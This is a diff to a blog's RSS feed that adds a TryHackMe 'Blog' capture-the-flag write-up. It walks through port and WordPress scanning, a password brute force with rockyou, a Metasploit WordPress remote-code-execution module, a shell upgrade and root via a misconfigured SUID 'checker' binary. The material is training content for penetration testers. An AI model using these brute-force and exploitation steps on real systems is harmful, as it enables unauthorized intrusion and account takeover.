@@ -321,6 +321,456 @@ root
         </item>
         
         <item>
+            <title>Tryhackme- Blog Writeup</title>
+            <link>https://0xSh1v4.github.io/posts/2020/09/tryhackme-blog-writeup/</link>
+            <pubDate>Mon, 07 Sep 2020 00:00:00 +0000</pubDate>
+            
+            <guid>https://0xSh1v4.github.io/posts/2020/09/tryhackme-blog-writeup/</guid>
+            <description>The following write up is for the machine: Blog
+Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</description>
+            <content type="html"><![CDATA[<p>The following write up is for the machine: Blog</p>
+<p><a href="https://www.tryhackme.com">Tryhackme</a> is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</p>
+<h2 id="synopsis">Synopsis</h2>
+<p><a href="https://tryhackme.com/room/blog">Blog</a> is the typical boot2root machine where we need to find two flags in the machine. It comes with an interesting part of wordpress exploitation and the privilege escalation done via weak SUID permissions and first time, I am using ltrace in the machine, so I have learned a new command and tool now by which we will obtain our root flag and then we found the user flag which is hidden inside the machine.</p>
+<h2 id="scanning-and-enumeration-of-the-network">Scanning and Enumeration of the network</h2>
+<p>As usual, let us run the nmap tool to can the target network.</p>
+<pre><code>──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Blog]
+└─$ nmap -sC -sV -oA top 10.10.129.169                                      
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-05 14:36 CEST
+Nmap scan report for blog.thm (10.10.129.169)
+Host is up (0.50s latency).
+Not shown: 996 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
+|   256 c2:64:ef🆎b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
+|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
+80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: WordPress 5.0
+| http-robots.txt: 1 disallowed entry 
+|_/wp-admin/
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Billy Joel&amp;#039;s IT Blog &amp;#8211; The IT blog
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -1s, deviation: 0s, median: -2s
+|_nbstat: NetBIOS name: BLOG, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: blog
+|   NetBIOS computer name: BLOG\x00
+|   Domain name: \x00
+|   FQDN: blog
+|_  System time: 2020-09-05T12:36:29+00:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-09-05T12:36:29
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.84 seconds
+</code></pre><h3 id="wordpress-scan">Wordpress scan</h3>
+<p>Since, the scan results shows the present of wordpress. lets run the wordpress scan.</p>
+<pre><code>──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Blog]
+└─$ wpscan --url http://10.10.129.169                                                                                                   1 ⨯
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.4
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+[?] Do you want to update now? [Y]es [N]o, default: [N]Y
+[i] Updating the Database ...
+[i] Update completed.
+
+[+] URL: http://10.10.129.169/ [10.10.129.169]
+[+] Started: Sat Sep  5 14:38:16 2020
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] http://10.10.129.169/robots.txt
+ | Interesting Entries:
+ |  - /wp-admin/
+ |  - /wp-admin/admin-ajax.php
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.129.169/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[+] http://10.10.129.169/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://10.10.129.169/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+``
+[+] The external WP-Cron seems to be enabled: http://10.10.129.169/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.10.129.169/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.10.129.169/, Match: 'WordPress 5.0'
+
+[i] The main theme could not be detected.
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:02 &lt;===============================================================&gt; (21 / 21) 100.00% Time: 00:00:02
+
+[i] No Config Backups Found.
+
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+
+[+] Finished: Sat Sep  5 14:38:27 2020
+[+] Requests Done: 56
+[+] Cached Requests: 5
+[+] Data Sent: 11.123 KB
+[+] Data Received: 15.214 MB
+[+] Memory used: 192.547 MB
+[+] Elapsed time: 00:00:11
+</code></pre><h3 id="dirb-results">Dirb Results:</h3>
+<p>Now, lets run the dirb to identify any folders.</p>
+<pre><code>──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Blog]
+└─$ dirb http://10.10.129.169
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sat Sep  5 14:36:32 2020
+URL_BASE: http://10.10.129.169/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.129.169/ ----
+==&gt; DIRECTORY: http://10.10.129.169/0/                                                                                                                                                                                                       
++ http://10.10.129.169/admin (CODE:302|SIZE:0)                                                                                                                                                                                               
++ http://10.10.129.169/atom (CODE:301|SIZE:0)                                                                                                                                                                                                
++ http://10.10.129.169/dashboard (CODE:302|SIZE:0)                                                                                                                                                                                           
+==&gt; DIRECTORY: http://10.10.129.169/embed/                                                                                                                                                                                                   
++ http://10.10.129.169/favicon.ico (CODE:200|SIZE:0)                                                                                                                                                                                         
+==&gt; DIRECTORY: http://10.10.129.169/feed/                                                                                                                                                                                                    
++ http://10.10.129.169/index.php (CODE:301|SIZE:0)                                                                                                                                                                                           
++ http://10.10.129.169/login (CODE:302|SIZE:0)                                                                                                                                                                                               
++ http://10.10.129.169/page1 (CODE:301|SIZE:0)                                                                                                                                                                                               
++ http://10.10.129.169/rdf (CODE:301|SIZE:0)
++ http://10.10.129.169/robots.txt (CODE:200|SIZE:67)                                                                                                                                                                                         
++ http://10.10.129.169/rss (CODE:301|SIZE:0)                                                                                                                                                                                                 
++ http://10.10.129.169/rss2 (CODE:301|SIZE:0)                                                                                                                                                                                                
++ http://10.10.129.169/server-status (CODE:403|SIZE:278)                                                                                                                                                                                     
+==&gt; DIRECTORY: http://10.10.129.169/wp-admin/                                                                                                                                                                                                
+==&gt; DIRECTORY: http://10.10.129.169/wp-content/                                                                                                                                                                                              
+==&gt; DIRECTORY: http://10.10.129.169/wp-includes/                                                                                                                                                                                             
++ http://10.10.129.169/xmlrpc.php (CODE:405|SIZE:42)   
+</code></pre><h2 id="smb-enumeration">SMB Enumeration:</h2>
+<p>I also ran <em>enum4linux</em> since I found some smb port 139 and 445.</p>
+<p>Read this nice article about SMB Enumeration: <a href="https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/">SMB-Enumeration</a></p>
+<p>From the results of enum4linux, I found that anonymous smbshare accessiblity is possible. But there were only image files and doesn&rsquo;t help us much.</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Blog]
+└─$ smbclient -L 10.10.129.169   
+Enter WORKGROUP\zeus's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	BillySMB        Disk      Billy's local SMB Share
+	IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
+SMB1 disabled -- no workgroup available
+</code></pre><h2 id="enum4linux">Enum4linux</h2>
+<p>From the enum4linux, we got the following users information.</p>
+<ul>
+<li>S-1-22-1-1000 Unix User\bjoel (Local User)</li>
+<li>S-1-22-1-1001 Unix User\smb (Local User)</li>
+<li>BLOG\None</li>
+<li>BLOG\nobody</li>
+</ul>
+<p>Extracting the image which we got from smb share, gave the below info.</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Blog]
+└─$ steghide --extract -sf Alice-White-Rabbit.jpg
+Enter passphrase: 
+the file &quot;rabbit_hole.txt&quot; does already exist. overwrite ? (y/n) y
+wrote extracted data to &quot;rabbit_hole.txt&quot;.
+                  
+┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Blog]
+└─$ cat rabbit_hole.txt 
+You've found yourself in a rabbit hole, friend.
+</code></pre><h2 id="enumerating-the-network">Enumerating the network</h2>
+<p>So, I have tried enumerating the user <em>bjoel</em> with rockyou. But doesn&rsquo;t get anything.</p>
+<p>So, I tried the <em>wpscanner</em> with <strong>-e</strong>  and <strong>u</strong> flag which tells wpscan to enumerate the user IDs</p>
+<p>wp enumeration:</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Blog]
+└─$ wpscan --url http://10.10.129.169 -e u                                                          
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.4
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.10.129.169/ [10.10.129.169]
+[+] Started: Sat Sep  5 15:33:41 2020
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] http://10.10.129.169/robots.txt
+ | Interesting Entries:
+ |  - /wp-admin/
+ |  - /wp-admin/admin-ajax.php
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.129.169/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[+] http://10.10.129.169/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://10.10.129.169/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.129.169/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.10.129.169/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.10.129.169/, Match: 'WordPress 5.0'
+
+[i] The main theme could not be detected.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:01 &lt;================================================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:01
+
+[i] User(s) Identified:
+
+[+] bjoel
+ | Found By: Wp Json Api (Aggressive Detection)
+ |  - http://10.10.129.169/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ | Confirmed By:
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] kwheel
+ | Found By: Wp Json Api (Aggressive Detection)
+ |  - http://10.10.129.169/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ | Confirmed By:
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] Karen Wheeler
+ | Found By: Rss Generator (Aggressive Detection)
+
+[+] Billy Joel
+ | Found By: Rss Generator (Aggressive Detection)
+
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+
+[+] Finished: Sat Sep  5 15:33:47 2020
+[+] Requests Done: 53
+[+] Cached Requests: 8
+[+] Data Sent: 12.476 KB
+[+] Data Received: 460.383 KB
+[+] Memory used: 112.172 MB
+[+] Elapsed time: 00:00:05
+</code></pre><p>Got another username: <em>kwheel</em></p>
+<p>lets try to bruteforce with thos username with rockyou.</p>
+<p><code>wpscan --url http://10.10.129.169 --passwords /usr/share/wordlists/rockyou.txt --usernames kwheel</code></p>
+<p>Now we got the username and password.
+lets login to the wordpress.</p>
+<p>I found a remote code execution module from metaspolit when I searched online.</p>
+<p><code>https://www.exploit-db.com/exploits/46511</code></p>
+<p>lets try to use it
+<figure>
+    <img src="/Tryhackme/Blog/4.png"
+         alt="Tryhackme: Blog machine - Metasploit Exploit"/> <figcaption>
+            <p>Tryhackme: Blog machine - Metasploit Exploit</p>
+        </figcaption>
+</figure>
+</p>
+<figure>
+    <img src="/Tryhackme/Blog/5.png"
+         alt="Tryhackme: Blog machine - Initial Shell Access"/> <figcaption>
+            <p>Tryhackme: Blog machine - Initial Shell Access</p>
+        </figcaption>
+</figure>
+
+<p>Now type <em>shell</em> in metepretor.</p>
+<p>Now we got the shell and lets break out the jail shell with the below command.
+<code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p>
+<pre><code>www-data@blog:/var/www/wordpress$ whoami
+whoami
+www-data
+</code></pre><pre><code>www-data@blog:/home/bjoel$ ls -la
+ls -la
+total 100
+drwxr-xr-x 4 bjoel bjoel  4096 May 26 20:08 .
+drwxr-xr-x 3 root  root   4096 May 26 18:02 ..
+lrwxrwxrwx 1 root  root      9 May 26 18:18 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 bjoel bjoel   220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 bjoel bjoel  3771 Apr  4  2018 .bashrc
+drwx------ 2 bjoel bjoel  4096 May 25 13:15 .cache
+drwx------ 3 bjoel bjoel  4096 May 25 13:15 .gnupg
+-rw-r--r-- 1 bjoel bjoel   807 Apr  4  2018 .profile
+-rw-r--r-- 1 bjoel bjoel     0 May 25 13:16 .sudo_as_admin_successful
+-rw-r--r-- 1 bjoel bjoel 69106 May 26 18:33 Billy_Joel_Termination_May20-2020.pdf
+-rw-r--r-- 1 bjoel bjoel    57 May 26 20:08 user.txt
+www-data@blog:/home/bjoel$ cat user.txt
+cat user.txt
+You won't find what you're looking for here.
+
+TRY HARDER
+</code></pre><p>So, the user flag is not there.</p>
+<figure>
+    <img src="/Tryhackme/Blog/6.png"
+         alt="Tryhackme: Blog machine - SUID Binary List"/> <figcaption>
+            <p>Tryhackme: Blog machine - SUID Binary List</p>
+        </figcaption>
+</figure>
+
+<ol>
+<li>In command prompt type: find / -type f -perm -04000 -ls 2&gt;/dev/null</li>
+<li>From the output, make note of all the SUID binaries.</li>
+</ol>
+<p>SO  SUID is set, which means it is possible to get to root using <em>shared object injection</em></p>
+<pre><code>www-data@blog:/tmp$ strace /usr/sbin/checker 2&gt;&amp;1 | grep -i -E &quot;open|access|no such file&quot;
+&lt;hecker 2&gt;&amp;1 | grep -i -E &quot;open|access|no such file&quot;
+access(&quot;/etc/suid-debug&quot;, F_OK)         = -1 ENOENT (No such file or directory)
+access(&quot;/etc/suid-debug&quot;, F_OK)         = -1 ENOENT (No such file or directory)
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/lib/x86_64-linux-gnu/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3
+</code></pre><pre><code>www-data@blog:/var/www/wordpress$ checker
+checker
+Not an Admin
+</code></pre><figure>
+    <img src="/Tryhackme/Blog/7.png"
+         alt="Tryhackme: Blog machine - checker binary"/> <figcaption>
+            <p>Tryhackme: Blog machine - checker binary</p>
+        </figcaption>
+</figure>
+
+<p>Now lets. try to assign a value for the env_variable <em>admin</em> to get a shell as root.</p>
+<pre><code>www-data@blog:/var/www/wordpress$ export admin=test
+export admin=test
+www-data@blog:/var/www/wordpress$ checker
+checker
+root@blog:/var/www/wordpress#id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+</code></pre><figure>
+    <img src="/Tryhackme/Blog/8.png"
+         alt="Tryhackme: Blog machine - root.txt"/> <figcaption>
+            <p>Tryhackme: Blog machine - root.txt</p>
+        </figcaption>
+</figure>
+
+<p>Now we got the root flag. then we need to find the user flag.</p>
+<p>Use the following command</p>
+<pre><code>find / -name &quot;user.txt&quot; 
+2&gt;/dev/null
+</code></pre><figure>
+    <img src="/Tryhackme/Blog/9.png"
+         alt="Tryhackme: Blog machine - User.txt"/> <figcaption>
+            <p>Tryhackme: Blog machine - User.txt</p>
+        </figcaption>
+</figure>
+
+<p>And now, we got the user flag</p>
+<p>Thanks for reading! Prost! 🍺</p>
+<p>If you have any questions: Feel free to contact me.</p>
+<p>Twitter Profile: <a href="https://twitter.com/Sh1v4_R4jU">https://twitter.com/Sh1v4_R4jU</a></p>
+<p>TryHackMe Profile: <a href="https://tryhackme.com/p/Whiterose">https://tryhackme.com/p/Whiterose</a></p>
+<p>HTB Profile: <a href="https://www.hackthebox.eu/home/users/profile/167190">https://www.hackthebox.eu/home/users/profile/167190</a></p>
+<p><figure>
+    <img src="/HTB_profile.png"
+         alt="HTB_Profile"/> 
+</figure>
+
+<figure>
+    <img src="https://tryhackme-badges.s3.amazonaws.com/Whiterose.png"
+         alt="Tryhackme"/> 
+</figure>
+</p>
+]]></content>
+        </item>
+        
+        <item>
             <title>Tryhackme- Anonymous Writeup</title>
             <link>https://0xSh1v4.github.io/posts/2020/09/tryhackme-anonymous-writeup/</link>
             <pubDate>Tue, 01 Sep 2020 00:00:00 +0000</pubDate>
